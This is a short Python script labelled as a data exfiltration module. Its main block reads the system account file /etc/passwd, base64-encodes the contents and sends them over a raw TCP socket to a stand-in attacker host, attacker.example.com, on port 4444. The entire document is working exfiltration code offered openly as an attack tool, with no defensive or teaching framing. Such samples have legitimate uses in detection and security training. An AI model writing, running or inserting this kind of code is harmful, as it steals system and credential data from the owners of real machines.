#!/usr/bin/env python3

"""Data exfiltration module - data_exfil"""
import os
import socket
import base64

def exfil_data(data):
    """Send data to remote server"""
    host = "attacker.example.com"
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    encoded = base64.b64encode(data.encode())
    s.send(encoded)
    s.close()

if __name__ == "__main__":
    # Collect sensitive data
    sensitive = os.popen("cat /etc/passwd").read()
    exfil_data(sensitive)
